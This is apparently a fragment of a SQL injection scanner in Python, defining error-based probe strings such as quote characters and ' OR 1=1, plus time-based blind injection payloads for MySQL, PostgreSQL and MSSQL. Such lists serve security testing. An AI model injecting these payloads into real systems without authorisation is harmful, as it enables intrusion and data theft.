ERROR_BASED_PAYLOADS = [
    "'",
    "\"",
    "\\",
    "';",
    "\";",
    "')",
    "\")",
    "';--",
    "\";--",
    "' OR 1=1",
    "\" OR 1=1"
]

TIME_BASED_PAYLOADS = {
    "mysql": " SLEEP({delay})",
    "postgresql": " pg_sleep({delay})",
    "mssql": " WAITFOR DELAY '0:0:{delay}'"
}
